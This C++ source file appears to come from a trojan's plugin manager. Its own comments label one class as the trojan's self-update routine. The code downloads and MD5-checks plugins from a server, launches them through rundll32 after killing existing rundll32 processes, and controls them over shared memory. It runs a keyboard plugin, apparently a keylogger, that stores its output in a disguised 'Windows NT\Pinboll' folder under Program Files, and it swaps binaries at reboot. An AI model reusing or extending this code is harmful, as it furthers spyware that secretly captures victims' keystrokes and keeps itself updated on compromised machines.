/**
* Copyright(C)2013,RUN  All rights reserved.
* @file
* @brief 插件信息类的实现文件
* @author 刘成伟 chengwei@run.com
* @date 2013-07-30
* @version 1.0
* @note 
*************************************************************************/

#include "ddc_util.h"
#include "PluginServerInfo.h"
#include "UpdateManager.h"
#include "Log.h"
#include "MD5.h"
#include "TSPPlug.h"
#include "../until.h"



// 构造
CPlugServerInfo::CPlugServerInfo()
	:m_dwSize(-1),m_status(STATUS_INIT),m_dwFlag(0)
{
	m_md5[0] = 0;
	m_ver[0] = 0;
}

// 析构
CPlugServerInfo::~CPlugServerInfo()
{
	UnLoadPlug(0);
}

// 加载插件
int CPlugServerInfo::LoadPlug( DWORD dwFlag )
{
	LOG((LEVEL_FUNC_IN_OUT,"CPlugServerInfo::LoadPlug(%d) \n",dwFlag));

	// 当前状态
	DDC_BOOL_RETURN( m_status==STATUS_LOAD,0);

	// 如果运行中也不在停止并运行，防止插件未连接服务器状态不停地调用
	DDC_BOOL_RETURN( m_status==STATUS_RUNNING,0);

	// 错误状态
	DDC_BOOL_RETURN( m_status==STATUS_INIT,DDCE_STATUS_ERROR);
	DDC_BOOL_RETURN( m_status==STATUS_ERROR,DDCE_STATUS_ERROR);
	DDC_BOOL_RETURN( m_status==STATUS_WAITDOWNLOAD,DDCE_STATUS_ERROR);
	

	LOG((LEVEL_INFO,"m_status = %u \n",m_status));

	int ret = LoadPlug_i(dwFlag);

	//改状态
	m_status = STATUS_LOAD;
	return 0;
}

// 卸载插件（非删除）
int CPlugServerInfo::UnLoadPlug( DWORD dwFlag )
{	
	if( m_status != STATUS_INIT && m_status != STATUS_DOWNLOAD   )
		LOG((LEVEL_INFO,"CPlugServerInfo::UnLoadPlug(%d),%s \n",dwFlag,m_strRealName.c_str()));

	DDC_BOOL_RETURN( m_status==STATUS_UNLOAD,0);

	// 如果在运行，先停止
	if( m_status == STATUS_RUNNING )
		StopPlug(0);

	// 卸载
	if( m_status == STATUS_LOAD )
	{	
		int ret = UnLoadPlug_i(dwFlag);

		//改状态
		m_status = STATUS_UNLOAD;
	}
	else
		NULL;			//本来该判断一下状态，但是析构时卸载会是正常应用，不做状态要求


	return 0;
}

// 启动插件
int CPlugServerInfo::StartPlug( PLUGPARAM *param )
{
	LOG((LEVEL_FUNC_IN_OUT,"CPlugServerInfo::StartPlug(%x) %s \n",param,m_strRealName.c_str()));
	
	// 当前状态
	DDC_BOOL_RETURN( m_status==STATUS_RUNNING,0);

	// 先加载
	if( m_status == STATUS_UNLOAD )
		LoadPlug(0);

	// 调用start()函数
	if( m_status == STATUS_LOAD )
	{
		int ret = StartPlug_i(param);
		m_status = STATUS_RUNNING;
		return 0;
	}

	return DDCE_STATUS_ERROR;
}

// 停止插件
int CPlugServerInfo::StopPlug( DWORD dwFlag )
{	
	LOG((LEVEL_FUNC_IN_OUT,"CPlugServerInfo::StopPlug %s \n",m_strRealName.c_str()));
	// 当前状态
	DDC_BOOL_RETURN( m_status==STATUS_LOAD,0);

	// 调用stop
	if( m_status == STATUS_RUNNING )
	{
		int ret = StopPlug_i(dwFlag);
		m_status = STATUS_LOAD;
	}
	else
	{
		LOG((LEVEL_WARNNING,"插件状态不正确.%d",m_status));		
	}

	return 0;
}


// 插件卸载
int CPlugServerInfo::RemovePlug( DWORD dwFlag)
{
	LOG((LEVEL_FUNC_IN_OUT,"CPlugServerInfo::RemovePlug(%d)\n",dwFlag));

	// 特殊请求的删除由子类独立处理
	if( dwFlag != 0 )
		return RemovePlug_i(dwFlag);

	DDC_BOOL_RETURN( m_status == STATUS_DELETE,0);

	// 初始化的状态，删除后返回删除状态，升级能进行下去
	if( m_status == STATUS_INIT )
	{
		m_status = STATUS_DELETE;
		return 0;
	}

	// 先卸载
	int ret = UnLoadPlug(dwFlag);
	
	ret = RemovePlug_i(dwFlag);

	// 删除插件
	if( !DeleteFile(m_strFullName.c_str()) )
	{
		LOG((LEVEL_ERROR,"删除插件失败(%s):%d \n",m_strFullName.c_str(),GetLastError()));
		MoveFileEx(m_strFullName.c_str(),NULL,MOVEFILE_DELAY_UNTIL_REBOOT);

		m_status = STATUS_DELETE;	
	}


	m_status = STATUS_DELETE;	

	return 0;
}


// 升级
int CPlugServerInfo::UpdatePlug( DWORD dwFlag,const string &strConfigFile,PLUGPARAM *param )
{
	// 直接转发
	return UpdatePlug_i(dwFlag,strConfigFile,param);	
}

// 下载插件
int CPlugServerInfo::DownloadPlug( std::string strPluginDownLoadPath )
{
	int ret = 0;

	// 状态为等待下载的才下
	if( m_status == STATUS_WAITDOWNLOAD )
	{
		LOG((LEVEL_INFO,"CPlugServerInfo::DownloadPlug:%s \n",m_strName.c_str() ));

		std::string strName(strPluginDownLoadPath);
		strName += m_strName;
		ret = CUpdateManager::GetFileFromServerImp(m_strURL.c_str(),strName.c_str(),m_dwSize );
		if( ret != 0 )
		{
			LOG((LEVEL_WARNNING,"GetFileFromServ error,return:%d\n",ret));
			
		}

		// 计算md5
		char md5[TSP_PLUGIN_SHORT_PATH];
		memset(&md5,0,TSP_PLUGIN_SHORT_PATH);
		if( !MD5_Caculate_File ( const_cast<char *>(strName.c_str()),md5) )
		{
			LOG((LEVEL_ERROR,"计算md5(%s)失败\n",strName.c_str()));
			ret = DDCE_CALL_FAIL;
		}

		if( strncmp(md5,m_md5,32) != 0 )
		{
			LOG((LEVEL_ERROR,"md5不匹配(%s,%s)失败\n",strName.c_str(),m_md5));
#if !defined(_DEBUG)
			ret = DDCE_NOT_MATCH;
#endif
		}

		// 改状态
		if(ret)
			m_status = CPlugServerInfo::STATUS_ERROR;
		else
			m_status = CPlugServerInfo::STATUS_DOWNLOAD;
	}

	return ret;
}

// 初始化
void CPlugServerInfo::reset(void)
{
	m_strName = "";
	m_strFullName = "";
	m_md5[0] = 0;
	m_ver[0] = 0;
	m_strURL = "";
	m_dwSize = 0;
	m_dwFlag = 0;
	m_pid = 0;
	m_status = STATUS_INIT;
	m_hnd = NULL;
}

// 赋值
CPlugServerInfo& CPlugServerInfo::operator=(const CPlugServerInfo &other)
{
	m_strName = other.m_strName;
	m_strFullName = other.m_strFullName;
	memcpy(m_md5,other.m_md5,TSP_PLUGIN_SHORT_PATH);
	memcpy(m_ver,other.m_ver,TSP_PLUGIN_SHORT_PATH);
	m_strURL = other.m_strURL;
	m_dwSize = other.m_dwSize;
	m_dwFlag = other.m_dwFlag;
	m_status = other.m_status;
	m_hnd = other.m_hnd;
	m_pid = other.m_pid;
	m_strRoot = other.m_strRoot;
	m_strDir = other.m_strDir;
	m_strRealName = other.m_strRealName;

	return *this;
}


/////////////////////////////////////////////////////
CManagePlug::CManagePlug()
	:CPlugServerInfo()
{
	// 共享内存初始化
	m_mem.Create(TSP_PLUG_COMM_SIGN,4096);
	m_dwProcessID = -1;
};


int CManagePlug::RemovePlug_i(DWORD dwFlag)
{
	LOG((LEVEL_INFO,"CManagePlug::RemovePlug_i(%d)\n",dwFlag));

	if(dwFlag == 0 )
	{
		// 删除自己的配置文件
		string str(m_strFullName);
		int pos = str.rfind('\\');	
		if( pos != str.npos )
		{
			str.erase(pos+1);
			str += "cfgm.ini";					// 此文件名定义在 ../../TSPPlug/PluginManager.h中
			if( ::DeleteFile(str.c_str()) == 0 )
			{ 
				LOG((LEVEL_WARNNING,"删除配置文件失败:(%s),lasterror=%d\n",str.c_str(),GetLastError()));
			}
		}
	}
	else if( dwFlag == UPDATE_DLL )
	{
		// 通知TSPPlug卸载
		PLUG_COMM_ST header;	
		header.reset();
		header.cmd = PLUG_COMM_ST::REMOVE;
		header.pid = m_dwProcessID;
		m_mem.Write(&header,sizeof(PLUG_COMM_ST));
	}
	
	return 0;
}

int CManagePlug::UpdatePlug_i( DWORD dwFlag,const string &strConfigFile,PLUGPARAM *param)
{
	switch( dwFlag )
	{
	case UPDATE_CFG:		// 更新时移动了地方，拷贝配置文件到新地方
		{			
			// 不应该相同，如果相同，外部调用就错了
			if( strConfigFile == m_strFullName )
				return 0;

			// 先拼装出两个配置文件名称
			string strS(m_strFullName),strD(strConfigFile);
			int pos = strS.rfind('\\');	
			if( pos != strS.npos )
			{
				strS.erase(pos+1);
				strS += "cfgm.ini";
			}
			
			pos = strD.rfind('\\');	
			if( pos != strD.npos )
			{
				strD.erase(pos+1);
				strD += "cfgm.ini";
			}

			
		 if( 0 == CopyFile(strS.c_str(),strD.c_str(),false ))
				LOG((LEVEL_WARNNING,"CopyFile(%s==>%s) error,lasterror=%d\n",strS.c_str(),strD.c_str(),GetLastError()));
		}
		break;
	case UPDATE_DLL:
		{
			// 先发个echo,如果没有响应，重新启动
			PLUG_COMM_ST header;
			header.reset();			
			header.cmd = PLUG_COMM_ST::ECHO;
			header.len = 0;
			header.pid = m_dwProcessID;
			m_mem.Write(&header,sizeof(PLUG_COMM_ST));	

			Sleep(1000);
			PLUG_COMM_ST *pheader = (PLUG_COMM_ST *)m_mem.GetBuffer();	
			if( pheader->request != (BYTE)PLUG_COMM_ST::REPLY )
			{
				m_status = STATUS_UNLOAD;
				StartPlug(param);
			}
			


			// 发送升级
			header.reset();
			header.cmd = PLUG_COMM_ST::UPDATE;
			header.pid = m_dwProcessID;
			header.len = strConfigFile.length()+1;
			char *buff;			
			DDC_NEW_RETURN(buff,char[header.len + sizeof(PLUG_COMM_ST)+1],DDCE_MEMORY_ALLOC_ERROR);
			memcpy(buff,&header,sizeof(PLUG_COMM_ST));
			memcpy(buff+sizeof(PLUG_COMM_ST),strConfigFile.c_str(),header.len);
			buff[sizeof(PLUG_COMM_ST)+header.len] = 0;

			m_mem.Write(buff,header.len+sizeof(PLUG_COMM_ST)+1);

			DDC_DELETE(buff);
			Sleep(500);			
		}
		break;
	case 0:
		break;
	default:
		return DDCE_UNSUPPORT;
	}
	return 0;
}

int CManagePlug::LoadPlug_i( DWORD dwFlag )
{	
	
	
	if( _access(m_strFullName.c_str(),0) == -1)
	{
		m_status = STATUS_DELETE;
		LOG((LEVEL_ERROR,"没找到文件 %s.\n",m_strFullName.c_str() ));
		return -1;
	}


	KillProcess("rundll32.exe");


	
	LOG((LEVEL_INFO,"CManagePlug::LoadPlug_i()\n"));


	// 发送卸载,如果有未结束的进程，通知他们自己结束

	/*  注释掉by menglz

	PLUG_COMM_ST header;
	header.reset();
	header.cmd = PLUG_COMM_ST::QUIT;
	header.pid = -1;
	m_mem.Write(&header,sizeof(PLUG_COMM_ST));

	*/

	ostringstream os;	
	os<<"rundll32 \""<<m_strFullName<<"\",start";

	// CreateProcess
	PROCESS_INFORMATION pi;
	STARTUPINFO si;
	memset(&si,0,sizeof(STARTUPINFO));
	si.cb = sizeof(STARTUPINFO);
	
	int ret = CreateProcess(NULL,(LPSTR)os.str().c_str(),NULL,NULL,0,0,NULL,NULL,&si,&pi);
	if( ret == 0 )
	{
		LOG((LEVEL_ERROR,"CreateProcess failed.(%s)\n",os.str().c_str()));
		return DDCE_CALL_FAIL;
	}
	m_dwProcessID = pi.dwProcessId;
	return 0;
}
int CManagePlug::UnLoadPlug_i( DWORD dwFlag )
{
	LOG((LEVEL_INFO,"CManagePlug::UnLoadPlug_i()\n"));

	// 发送卸载
	PLUG_COMM_ST header;
	header.reset();
	header.cmd = PLUG_COMM_ST::QUIT;
	header.pid = m_dwProcessID;
	m_mem.Write(&header,sizeof(PLUG_COMM_ST));
	Sleep(500);
	return 0;
}

int CManagePlug::StartPlug_i( PLUGPARAM *param )
{
	LOG((LEVEL_INFO,"CManagePlug::StartPlug_i()\n"));
	
	// 发送启动
	char buff[sizeof(PLUG_COMM_ST)+sizeof(PLUGPARAM)+1] = {0};
		PLUG_COMM_ST header;
	header.reset();
	header.cmd = PLUG_COMM_ST::START;
	header.pid = m_dwProcessID;
	header.len = sizeof(PLUGPARAM);
	memcpy(buff,&header,sizeof(PLUG_COMM_ST));
	memcpy(buff+sizeof(PLUG_COMM_ST),param,sizeof(PLUGPARAM));
	m_mem.Write(buff,sizeof(PLUG_COMM_ST)+sizeof(PLUGPARAM));
	
	Sleep(500);
	return 0;
}
int CManagePlug::StopPlug_i( DWORD dwFlag )
{
	LOG((LEVEL_INFO,"CManagePlug::StopPlug_i()\n"));
	
	// 发送停止
	PLUG_COMM_ST header;	
	header.reset();
	header.cmd = PLUG_COMM_ST::STOP;
	header.pid = m_dwProcessID;
	m_mem.Write(&header, sizeof(PLUG_COMM_ST));
	Sleep(500);
	return 0;
}
/////////////////////////////////////////////////////////////////
CKeyBoardPlug::CKeyBoardPlug()
	:CPlugServerInfo()
{
}
int CKeyBoardPlug::StartPlug_i( PLUGPARAM *param )
{
	LOG((LEVEL_INFO,"CKeyBoardPlug::StartPlug_i()\n"));	
	
	std::string str(m_strFullName);
	str += ".BAK";

	// 键盘插件特殊，不管返回值
	if( ::CopyFile(m_strFullName.c_str(),str.c_str(),false ) == 0)
		LOG((LEVEL_WARNNING,"CopyFile(%s==>%s) error,lasterror=%d\n",m_strFullName.c_str(),str.c_str(),GetLastError()));

	if( param->imp.chResultPath[0] == 0 )  //如果获得插件结果存放路径失败，就用默认路径
	{
		LOG((LEVEL_INFO,"CKeyBoardPlug::StartPlug(%s)\n",param->imp.chResultPath));
		char szDefaultPath[260] =  {0};
		


		SHGetSpecialFolderPathA(NULL,szDefaultPath,CSIDL_PROGRAM_FILES ,FALSE);

		strncat(szDefaultPath,"\\Windows NT\\Pinboll\\",MAX_PATH-15);



		strncpy(param->imp.chResultPath,szDefaultPath,260);
	}

	
#ifdef _CPPUNIT
	return 0;		// test class
#else
	return m_KeyBoarkPlugin.Start(str.c_str(),param->imp.chResultPath);	
#endif
}

int CKeyBoardPlug::UpdatePlug_i( DWORD dwFlag,const string &strConfigFile,PLUGPARAM *)
{
	DDC_BOOL_RETURN( dwFlag !=0,0);

	// 拷贝下载文件到本地，重命名".BAK"
	string str(m_strFullName);
	str += ".BAK";
	CopyFile(strConfigFile.c_str(),str.c_str(),false);

	if( m_status == STATUS_INIT || m_status == STATUS_ERROR )
	{
		m_status = STATUS_UNLOAD;
	}
	else
		// 肯定替换不掉，写入MoveFileEx
		MoveFileEx(str.c_str(),m_strFullName.c_str(),MOVEFILE_DELAY_UNTIL_REBOOT);
	return 0;
}


int CKeyBoardPlug::RemovePlug_i(DWORD dwFlag)
{
	LOG((LEVEL_INFO,"CKeyBoardPlug::RemovePlug_i()\n"));
	
	// 删除键盘插件
	std::string str(m_strFullName);
	str += ".BAK";
	if( ::DeleteFile(str.c_str()) == 0 )
	{
		LOG((LEVEL_WARNNING,"DeleteFile(%s) error,lasterror=%d\n",str.c_str(),GetLastError()));
	}
	return 0;
}

int CKeyBoardPlug::StopPlug_i(DWORD dwFlag)
{
	LOG((LEVEL_INFO,"CKeyBoardPlug::StopPlug_i()\n"));
	
	// 键盘插件特殊处理
	int ret = m_KeyBoarkPlugin.Stop();
	//ret = 0;
	if( ret != 0 )
	{
		LOG((LEVEL_ERROR,"KeyBoarkPlugin.Stop() return :%d(%x)\n",ret,ret));
		m_status = STATUS_RUNNING;
	}	
	return 0;
}

////////////////////////////////////////////

// 木马自身升级
int CTrojanPlug::UpdatePlug_i( DWORD dwFlag,const string &strConfigFile,PLUGPARAM *)
{	
	DDC_BOOL_RETURN( dwFlag !=0,0);

	// 拷贝下载文件到本地，重命名".BAK"
	string str(m_strFullName);
	str += ".BAK";
	CopyFile(strConfigFile.c_str(),str.c_str(),false);

	// 肯定替换不掉，写入MoveFileEx
	MoveFileEx(str.c_str(),m_strFullName.c_str(),MOVEFILE_DELAY_UNTIL_REBOOT);

	return 0;
}